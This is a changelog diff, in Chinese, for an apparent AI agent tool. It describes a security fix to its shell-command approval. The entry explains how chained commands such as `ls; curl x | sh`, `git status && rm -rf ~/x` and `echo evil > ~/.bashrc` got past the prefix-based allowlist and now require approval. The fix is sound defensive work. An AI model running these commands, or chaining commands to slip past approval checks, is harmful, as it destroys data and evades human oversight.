@@ -16,6 +16,16 @@
 
 ### Changed
 
+- **`jellyfish-plugin-shell` 的命令判定改为「按段」**（安全修复）：执行侧是 `/bin/sh -c 原文`，
+  而判定只比对原文前 1~2 个 token，于是 `ls; curl x | sh`、`git status && rm -rf ~/x` 这类命令的
+  第一个 token 命中只读表/白名单就被整串免审批执行——白名单与只读表这两个被当作约束的机制同时失效。
+  现在先按未引用状态下的 `;`、`|`、`&` 与换行切段，**每段各自过白名单、可信表与只读表并取最严结果**；
+  可信表要求**全段命中**（`trustedCommands: ["mvn test"]` 不再顺带放行 `mvn test; rm -rf x`）；
+  命令替换与重定向（如 `echo evil > ~/.bashrc`）**升级为人工审批**，因为前缀匹配看不见后半段的动作。
+  引号内的分隔符与重定向仍是字面量；引号未闭合时不给结论、一律问人。
+  `git branch`、`git remote` 移出内置只读表——它们有 `-D` / `remove` 这类改写子命令，
+  与 `find`、`git fetch` 同属误判点。**配了 `allowedCommands` 或 `trustedCommands` 的用法需要复核一遍**：
+  含管道、重定向或复合命令的调用现在会走向审批（无人值守下即拒绝）。
 - Maven 坐标由 `zcd` 改为 `io.github.zcd0831`，版本号统一到 0.1.1（含各插件描述符里的 `plugin.version`）；
   插件依赖的内核契约改为 `io.github.zcd0831:jellyfish-api`，与内核 0.1.1 配套。
 - 官方插件仍不发布到 Maven Central（它们是 PF4J 插件包，按 `cpPlugins.sh` 装到内核的插件目录）。
@@ -23,6 +33,14 @@
   于是会话中途新建的 `AGENTS.md` 在本会话里永远看不见——那正好抵消了 `/init` 的意义。
   现在空贡献每轮重探一次（只多一次 `stat`，不读内容）；**已经读到过的内容仍按会话缓存一次**，
   「会话中途修改 `AGENTS.md` 要开新会话才生效」这条不变。
+
+### Fixed
+
+- `jellyfish-script`：桥接插件 `stop()` 从不关闭事件桥（`ScriptEventBridge.close()` 全仓无调用点），
+  而推送线程的循环条件是 `!closed || !queue.isEmpty()` 且阻塞在 `queue.take()` 上——`closed` 永远为
+  `false`，于是每次停止（含 `/reload` 重启插件）都留下一条常驻线程与一整份对象图（网关、队列、
+  `PluginContext` 被强引用）。现在 `stop()` 会关闭事件桥，并排在 `gateway.close()` 之前
+  （事件桥唯一的出口就是网关）。同时给 `close()` 的 `join` 补了超时告警。
 
 ## [0.1.0] - 2026-10-07
 
